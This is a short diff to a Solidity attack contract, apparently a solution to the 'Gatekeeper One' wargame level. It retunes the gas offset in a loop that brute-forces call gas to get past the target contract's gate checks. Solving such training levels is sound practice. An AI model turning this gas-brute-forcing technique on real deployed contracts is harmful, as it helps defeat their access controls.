@@ -14,11 +14,11 @@ contract GatekeeperOneAttack {
       key
     );
 
-    // gas offset usually comes in around 180, give a buffer of 60 on each side
+    // gas offset usually comes in around 210, give a buffer of 60 on each side
     for (uint256 i = 0; i < 120; i++) {
       if (
         address(GatekeeperOneContractAddress).call.gas(
-          i + 120 + 8191 * 3
+          i + 150 + 8191 * 3
         )(
           encodedParams
         )
